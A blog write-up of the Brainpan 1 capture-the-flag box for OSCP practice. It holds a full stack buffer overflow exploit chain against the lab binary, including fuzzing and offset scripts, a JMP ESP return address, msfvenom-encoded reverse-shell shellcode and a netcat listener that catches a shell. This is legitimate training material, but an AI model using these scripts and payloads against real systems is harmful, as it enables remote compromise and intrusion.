---
layout: post
current: post
cover: 'assets/images/brainpan/cover.png'
navigation: True
title: Brainpan 1 Write Up
date: 2020-10-10 00:00:00
tags: [tryhackme, ctf, easy, bufferoverflow, oscp]
class: post-template
subclass: 'post'
author: darryn
---
![brainpan](/assets/images/brainpan/cover.png)

### Overview

Brainpan is a great OSCP practice room on [TryHackMe](https://tryhackme.com). The box was first released on Vulnhub by [superkojiman](https://twitter.com/superkojiman) so full credit to you for a fantastic box that I'm sure has helped a lot of people prepare for the OSCP exam. I completed the room about 5 days before I took the OSCP exam and I think it really helped enforce what I had learnt on the course and kept the steps fresh in my mind. 

### Nmap

TryHackMe will assign a dynamic IP as part of the deployment, I've edited my /etc/hosts file with the name of the box and the assigned IP. I started by doing an nmap scan to check what ports are open.

```highlight
┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]                                                                                                                             
└──╼ $sudo nmap -sC -sV -oA nmap/initial brainpan                                                                                                                      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-10 12:16 BST                                                                                                             
Nmap scan report for brainpan                                                                                                                                          
Host is up (0.030s latency).                                                                                                                                                
Not shown: 998 closed ports                                                                                                                                                 
PORT      STATE SERVICE VERSION                                                                                                                                             
9999/tcp  open  abyss?                                                                                                                                                      
| fingerprint-strings:                                                                                                                                                      
|   NULL:                                                                                                                                                                   
|     _| _|                                                                                                                                                                 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|                                                                                                                     
|     _|_| _| _| _| _| _| _| _| _| _| _| _|                                                                                                                                 
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|                                                                                                                         
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=10/10%Time=5F81982F%P=x86_64-pc-linux-gnu%r(N
SF:ULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\
SF:|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20
SF:\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\
SF:x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\
SF:x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20
SF:_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\
SF:x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\
SF:x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\
SF:x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.85 seconds
```

2 ports open 9999 and 10000.

### Enumeration

Starting with 9999 I use netcat to look at the port.

```highlight
┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $nc brainpan 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                            

                          >> test
                          ACCESS DENIED
```

Port 9999 provides a banner with the name of the machine and also a input to enter a password.

Port 10000 is a python http server. 

![brainpan](/assets/images/brainpan/web.png)

Navigating to the page just displays a image about safe coding. Nothing useful in the source either. I ran a gobuster to check for other directories.

```highlight
┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $gobuster dir -u http://brainpan:10000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://brainpan:10000
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/10 12:25:40 Starting gobuster
===============================================================
/bin (Status: 301)
===============================================================
2020/10/10 12:29:46 Finished
===============================================================
```

Only one, navigating to the directory presents a brainpan.exe file

![bin](/assets/images/brainpan/bin.png)

As I know this machine is based around buffer overflow its safe to assume this is the file I will need to analyse. I'm more comfortable working in Immunity Debugger on Windows for exploit development so I transfer the file over to my windows VM. I have a shared folder on my host machine that I can use to copy files between VM's so I copy the file in to that folder on my ParrotOS machine and boot my Windows VM.

### Exploit Development

Now I have the exe on my windows machine, I ran the file and as expected it appears to be the application I connected to on port 9999. From my Parrot machine I connect to my windows machine on port 9999.

![brainpan](/assets/images/brainpan/bin.png)

I get the same prompt. Next I opened Immunity Debugger and attached the brainpan service. (This step is repeated a lot during exploit development! Each time I run my exploit script I closed Immunity Debugger reopen and reattach the brainpan.exe)

#### Fuzzing

Looking at the output from the exe console, the application is copying the input to a buffer. So first we need need to fuzz the application to see if we can crash the application and overwrite the buffer.

I have created a very simple python script to fuzz the application. I updated my hosts file to connect to my windows VM rather than TryHackMe for now.

{% highlight python %}
#!/usr/bin/python3

import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("brainpan",9999))
        s.recv(1024)
        s.send(buffer + "\r\n")
        s.close()
        sleep(1)
        buffer = buffer + "A" * 100

    except:
       print("Fuzzing crashed at %s bytes" % str(len(buffer)))
       sys.exit()
{% endhighlight %}

The script will send 100 A's to the application and will keep increasing the sent characters by 100 on each attempt. If the application crashes the script will fail and print out the length of A's sent at the time of the crash. 

```highlight
┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $sudo python exploit.py
Fuzzing crashed at 700 bytes
```

Running the script I can see it crashed at 700 bytes. Looking in Immunity debugger I can see the status is now showing 'Paused' rather than running indicating a crash.

![crash](/assets/images/brainpan/crash.png)

EIP is showing 41414141 which is AAAA so we have successfully overwrote EIP. If I can control EIP I may be able to exploit the application to create a reverse shell.

#### Find Offset

The next step is to find the offset of the crash, I have successfully overwrote EIP but I need to determine the offset so I can accurately control the value inputted in to EIP. To find the offset I used the msf pattern create. This will create a cyclic pattern string of characters that I can put in to my script.

```highlight
┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $msf-pattern_create -l 700
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4A
f5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al
0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5
Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0A
w1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A
```

-l is to set the length of the string, the fuzzing script determined the application crashed at 700 bytes so I set the pattern to 700.

I've updated the script with the string and also removed the while true as we are no longer fuzzing.

{% highlight python %}
#!/usr/bin/python3

import sys, socket
from time import sleep

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1
Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6A
k7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq
2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7
Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A"

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("brainpan",9999))
    s.recv(1024)
    s.send(buffer + "\r\n")
    s.close()

except:
   print("Application crashed")
   sys.exit()
{% endhighlight %}

Running the script again crashes the application as excepted.

![EIP-Crash](/assets/images/brainpan/EIP-Crash.png)

EIP now has a value of 35724134. I use msf pattern offset to determine the EIP offset.

```highlight
┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $msf-pattern_offset -l 700 -q 35724134
[*] Exact match at offset 524
```

Great the offset is 524. To make sure its correct I've updated the script with a buffer of 524 A's, 4 B's which is what will be shown as 42424242 in EIP and the remaining bytes as D's. Ive also added a slight offset of 4 C's

{% highlight python %}
#!/usr/bin/python3

import sys, socket
from time import sleep

filler = "A" * 524
EIP = "B" * 4
offset = "C" * 4
junk = "D" * (700 -len(filler)-len(EIP))
buffer = filler + EIP + offset + junk


try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("brainpan",9999))
    s.recv(1024)
    s.send(buffer + "\r\n")
    s.close()

except:
   print("Application crashed")
   sys.exit()
{% endhighlight %}

I ran the exploit script again.

![EIP](/assets/images/brainpan/EIP.png)

I now control EIP! 

#### Bad Characters

Before I go any further I need to check for bad characters that could break the exploit. To do this I updated the script with the following string. Normally I remove /x00 as this is a null byte and will break the exploit however to show the process of identifying bad characters I have kept it in. 

```highlight
\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f
\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40
\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f
\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f
\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f
\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf
\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf
\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

Ive updated the script with the bad character list.

{% highlight python %}
#!/usr/bin/python3

import sys, socket
from time import sleep

badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

filler = "A" * 524
EIP = "B" * 4
offset = "C" * 4
junk = "D" * (700 -len(filler)-len(EIP))
buffer = filler + EIP + offset + badchars

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("brainpan",9999))
    s.recv(1024)
    s.send(buffer + "\r\n")
    s.close()

except:
   print("Application crashed")
   sys.exit()
{% endhighlight %}

I ran the script again and checked Immunity Debugger.

![dump](/assets/images/brainpan/dump.png)

To check for any issues I right clicked on ESP and selected 'Follow in Dump'. 

![badchar](/assets/images/brainpan/badchar.png)

From the output I can see my offset of C's which is 43 43 43 43 then the null byte 00 but instead of 01 I see FB, thats not what I expected which highlights that \x00 is a bad character. I update my script removing /x00 from the bad chars list and run it again.

![goodchar](/assets/images/brainpan/goodchar.png)

This looks like what I was expecting, I can see my offset and then each of the characters in the bad char list. Scanning through I don't see any more bad characters. I.e no other characters have malformed the output.

#### Find a Return Address

Our next step is to find a return address for our exploit. To do this I use the Immunity Debugger plugin mona.py plugin. Running '!mona modules' in the bottom bar of Immunity Debugger I can see all the modules used. I am looking for any module which has False displayed across columns as this means I don't need to worry about protection mechanisms. 

![monamodules](/assets/images/brainpan/monamodules.png)

Only one is available and its the brainpan.exe itself, now to check for JMP ESP pointers.  

![monafind](/assets/images/brainpan/monafind.png)

Again only one with the value 311712f3. x86 architectures stores values in memory using little endian which means we need to reverse the byte order when adding to our script.

Now I have a JMP ESP value I update the script.

{% highlight python %}
#!/usr/bin/python3

import sys, socket
from time import sleep

#badchars = /x00

filler = "A" * 524
EIP = "\xf3\x12\x17\x31" #JMP ESP - 311712f3
offset = "C" * 4
junk = "D" * (700 -len(filler)-len(EIP))
buffer = filler + EIP + offset + junk

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("brainpan",9999))
    s.recv(1024)
    s.send(buffer + "\r\n")
    s.close()

except:
   print("Application crashed")
   sys.exit()
{% endhighlight %}

#### Create shell code

Nearly finished, the last step is to add our payload that will create a reverse shell to our machine. To do this I used msfvenom.

```highlight
┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $msfvenom -p windows/shell_reverse_tcp LHOST=VPN IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xba\xc3\x19\x14\x09\xdb\xc6\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x50\x0e\x03\x93\x17\xf6\xfc\xef\xc0\x74"
"\xfe\x0f\x11\x19\x76\xea\x20\x19\xec\x7f\x12\xa9\x66\x2d\x9f"
"\x42\x2a\xc5\x14\x26\xe3\xea\x9d\x8d\xd5\xc5\x1e\xbd\x26\x44"
"\x9d\xbc\x7a\xa6\x9c\x0e\x8f\xa7\xd9\x73\x62\xf5\xb2\xf8\xd1"
"\xe9\xb7\xb5\xe9\x82\x84\x58\x6a\x77\x5c\x5a\x5b\x26\xd6\x05"
"\x7b\xc9\x3b\x3e\x32\xd1\x58\x7b\x8c\x6a\xaa\xf7\x0f\xba\xe2"
"\xf8\xbc\x83\xca\x0a\xbc\xc4\xed\xf4\xcb\x3c\x0e\x88\xcb\xfb"
"\x6c\x56\x59\x1f\xd6\x1d\xf9\xfb\xe6\xf2\x9c\x88\xe5\xbf\xeb"
"\xd6\xe9\x3e\x3f\x6d\x15\xca\xbe\xa1\x9f\x88\xe4\x65\xfb\x4b"
"\x84\x3c\xa1\x3a\xb9\x5e\x0a\xe2\x1f\x15\xa7\xf7\x2d\x74\xa0"
"\x34\x1c\x86\x30\x53\x17\xf5\x02\xfc\x83\x91\x2e\x75\x0a\x66"
"\x50\xac\xea\xf8\xaf\x4f\x0b\xd1\x6b\x1b\x5b\x49\x5d\x24\x30"
"\x89\x62\xf1\x97\xd9\xcc\xaa\x57\x89\xac\x1a\x30\xc3\x22\x44"
"\x20\xec\xe8\xed\xcb\x17\x7b\xd2\xa4\x16\x3d\xba\xb6\x18\xd0"
"\x66\x3e\xfe\xb8\x86\x16\xa9\x54\x3e\x33\x21\xc4\xbf\xe9\x4c"
"\xc6\x34\x1e\xb1\x89\xbc\x6b\xa1\x7e\x4d\x26\x9b\x29\x52\x9c"
"\xb3\xb6\xc1\x7b\x43\xb0\xf9\xd3\x14\x95\xcc\x2d\xf0\x0b\x76"
"\x84\xe6\xd1\xee\xef\xa2\x0d\xd3\xee\x2b\xc3\x6f\xd5\x3b\x1d"
"\x6f\x51\x6f\xf1\x26\x0f\xd9\xb7\x90\xe1\xb3\x61\x4e\xa8\x53"
"\xf7\xbc\x6b\x25\xf8\xe8\x1d\xc9\x49\x45\x58\xf6\x66\x01\x6c"
"\x8f\x9a\xb1\x93\x5a\x1f\xd1\x71\x4e\x6a\x7a\x2c\x1b\xd7\xe7"
"\xcf\xf6\x14\x1e\x4c\xf2\xe4\xe5\x4c\x77\xe0\xa2\xca\x64\x98"
"\xbb\xbe\x8a\x0f\xbb\xea";
```

msfvenom allows for the reverse shell payload to be created which I can add to the script. 

- -p - Set the payload in this case I wanted a windows reverse shell
- LHOST - Set to the TryHackMe VPN IP
- LPORT - A port on my machine
- EXITFUNC - If applicable it ensures an applications remains stable when the shell is closed
- -f - Set the format of the output to c
- -e - Encoding type to shikata_ga_nai
- -a - Set architecture
- -b - provide a list of the bad characters I found earlier

The final exploit script is:

{% highlight python %}
#!/usr/bin/python3                                                                                                        
                                                                                                                          
import sys, socket                                                                                                        
from time import sleep                                                                                                    
                                                                                                                          
#badchars = /x00                                                                                                          
                                                                                                                          
#msfvenom -p windows/shell_reverse_tcp LHOST=VPN IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b "\x00"
                                                                                                                          
payload = ("\xb8\x6b\x6e\x2b\xda\xda\xc8\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"                                                
"\x52\x31\x42\x12\x03\x42\x12\x83\x81\x92\xc9\x2f\xa9\x83\x8c"                                                            
"\xd0\x51\x54\xf1\x59\xb4\x65\x31\x3d\xbd\xd6\x81\x35\x93\xda"                                                            
"\x6a\x1b\x07\x68\x1e\xb4\x28\xd9\x95\xe2\x07\xda\x86\xd7\x06"
"\x58\xd5\x0b\xe8\x61\x16\x5e\xe9\xa6\x4b\x93\xbb\x7f\x07\x06"
"\x2b\x0b\x5d\x9b\xc0\x47\x73\x9b\x35\x1f\x72\x8a\xe8\x2b\x2d"
"\x0c\x0b\xff\x45\x05\x13\x1c\x63\xdf\xa8\xd6\x1f\xde\x78\x27"
"\xdf\x4d\x45\x87\x12\x8f\x82\x20\xcd\xfa\xfa\x52\x70\xfd\x39"
"\x28\xae\x88\xd9\x8a\x25\x2a\x05\x2a\xe9\xad\xce\x20\x46\xb9"
"\x88\x24\x59\x6e\xa3\x51\xd2\x91\x63\xd0\xa0\xb5\xa7\xb8\x73"
"\xd7\xfe\x64\xd5\xe8\xe0\xc6\x8a\x4c\x6b\xea\xdf\xfc\x36\x63"
"\x13\xcd\xc8\x73\x3b\x46\xbb\x41\xe4\xfc\x53\xea\x6d\xdb\xa4"
"\x0d\x44\x9b\x3a\xf0\x67\xdc\x13\x37\x33\x8c\x0b\x9e\x3c\x47"
"\xcb\x1f\xe9\xc8\x9b\x8f\x42\xa9\x4b\x70\x33\x41\x81\x7f\x6c"
"\x71\xaa\x55\x05\x18\x51\x3e\x20\xd5\x4c\x67\x5c\xe7\x6e\x86"
"\xc1\x6e\x88\xc2\xe9\x26\x03\x7b\x93\x62\xdf\x1a\x5c\xb9\x9a"
"\x1d\xd6\x4e\x5b\xd3\x1f\x3a\x4f\x84\xef\x71\x2d\x03\xef\xaf"
"\x59\xcf\x62\x34\x99\x86\x9e\xe3\xce\xcf\x51\xfa\x9a\xfd\xc8"
"\x54\xb8\xff\x8d\x9f\x78\x24\x6e\x21\x81\xa9\xca\x05\x91\x77"
"\xd2\x01\xc5\x27\x85\xdf\xb3\x81\x7f\xae\x6d\x58\xd3\x78\xf9"
"\x1d\x1f\xbb\x7f\x22\x4a\x4d\x9f\x93\x23\x08\xa0\x1c\xa4\x9c"
"\xd9\x40\x54\x62\x30\xc1\x74\x81\x90\x3c\x1d\x1c\x71\xfd\x40"
"\x9f\xac\xc2\x7c\x1c\x44\xbb\x7a\x3c\x2d\xbe\xc7\xfa\xde\xb2"
"\x58\x6f\xe0\x61\x58\xba")

filler = "A" * 524
EIP = "\xf3\x12\x17\x31" #JMP ESP - 311712f3
offset = "C" * 4
nops = "\x90" * 32
buffer = filler + EIP + offset + nops + payload

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("brainpan",9999))
    s.recv(1024)
    s.send(buffer + "\r\n")
    s.close()

except:
   print("Application crashed")
   sys.exit()
{% endhighlight %}

Before I run the script I change the hosts file to point to the machine IP provided by TryHackMe and start a netcat listener.

```highlight
┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.21.217] from (UNKNOWN) [10.10.220.224] 35409
CMD Version 1.4.1

Z:\home\puck>
```

We have a shell, the script worked! 

### Priv Esc

Although the main purpose of the machine is to help with buffer overflow we still need to get administrator on the box. Doing some basic enumeration of the box highlights its actually a linux machine and using wine to run the brainpan.exe application. So I update my exploit script with a linux msfvenom payload and get a new shell.

```highlight
┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $msfvenom -p linux/x86/shell_reverse_tcp LHOST=VPN IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xda\xd2\xd9\x74\x24\xf4\xbe\x14\x22\x5b\xcc\x5f\x29\xc9\xb1"
"\x12\x83\xef\xfc\x31\x77\x13\x03\x63\x31\xb9\x39\xba\xee\xca"
"\x21\xef\x53\x66\xcc\x0d\xdd\x69\xa0\x77\x10\xe9\x52\x2e\x1a"
"\xd5\x99\x50\x13\x53\xdb\x38\xae\xab\x0e\x61\xc6\xa9\x30\x80"
"\x4b\x27\xd1\x12\x15\x67\x43\x01\x69\x84\xea\x44\x40\x0b\xbe"
"\xee\x35\x23\x4c\x86\xa1\x14\x9d\x34\x5b\xe2\x02\xea\xc8\x7d"
"\x25\xba\xe4\xb0\x26";
```

Now with a new linux shell I enumerate the machine again.

```highlight
puck@brainpan:/home/puck$ sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
puck@brainpan:/home/puck$ 
```

Running sudo -l shows our user 'puck' can run /home/anansi/bin/anansi_util as root with out a password.

```highlight
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
puck@brainpan:/home/puck$ 
